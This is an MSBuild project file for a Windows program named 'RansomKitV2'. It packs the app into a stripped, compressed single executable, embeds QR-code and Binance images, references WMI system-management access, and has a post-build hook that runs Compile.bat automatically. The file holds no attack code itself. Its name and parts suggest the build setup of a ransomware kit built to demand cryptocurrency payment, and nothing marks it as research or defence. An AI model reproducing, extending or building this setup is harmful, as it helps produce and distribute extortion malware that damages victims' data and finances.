<Project Sdk="Microsoft.NET.Sdk">

	<PropertyGroup>
		<OutputType>WinExe</OutputType>
		<TargetFramework>net8.0-windows</TargetFramework>
		<UseWindowsForms>true</UseWindowsForms>
		<ImplicitUsings>enable</ImplicitUsings>
		<Nullable>enable</Nullable>

		<AllowUnsafeBlocks>true</AllowUnsafeBlocks>

		<RootNamespace>RansomKitV2</RootNamespace>
		<AssemblyName>RansomKitV2</AssemblyName>

		<PublishSingleFile>true</PublishSingleFile>
		<SelfContained>true</SelfContained>
		<RuntimeIdentifier>win-x64</RuntimeIdentifier>
		<IncludeNativeLibrariesForSelfExtract>true</IncludeNativeLibrariesForSelfExtract>
		<EnableCompressionInSingleFile>true</EnableCompressionInSingleFile>
		<DebugType>none</DebugType>
		<Optimize>true</Optimize>
	</PropertyGroup>

	<ItemGroup>
		<PackageReference Include="OpenCvSharp4" Version="4.13.0.20260627" />
		<PackageReference Include="OpenCvSharp4.runtime.win" Version="4.13.0.20260627" />
		<PackageReference Include="QRCoder" Version="1.4.3" />
		<PackageReference Include="System.Management" Version="10.0.14" />
	</ItemGroup>

	<!-- Bundle scanner + binance images inside the exe.
	     Exists() condition means build won't fail if a file is missing. -->
	<ItemGroup>
		<EmbeddedResource Include="scanner.png" Condition="Exists('scanner.png')" />
		<EmbeddedResource Include="scanner.jpg" Condition="Exists('scanner.jpg')" />
		<EmbeddedResource Include="scanner.jpeg" Condition="Exists('scanner.jpeg')" />
		<EmbeddedResource Include="binance.png" Condition="Exists('binance.png')" />
		<EmbeddedResource Include="binance.jpg" Condition="Exists('binance.jpg')" />
		<EmbeddedResource Include="binance.jpeg" Condition="Exists('binance.jpeg')" />
	</ItemGroup>

	<!-- THIS RUNS COMPILE.BAT AFTER VS BUILDS (BUT AVOIDS THE LOOP) -->
	<Target Name="AutoRunCompileBat" AfterTargets="Build" Condition="'$(Configuration)' == 'Release' AND '$(SKIP_CSHARP_BUILD)' != 'true'">
		<Message Importance="high" Text="==================================================" />
		<Message Importance="high" Text="Build finished. Auto-launching Compile.bat..." />
		<Message Importance="high" Text="==================================================" />

		<Exec Command="call &quot;$(ProjectDir)Compile.bat&quot;" />
	</Target>

</Project>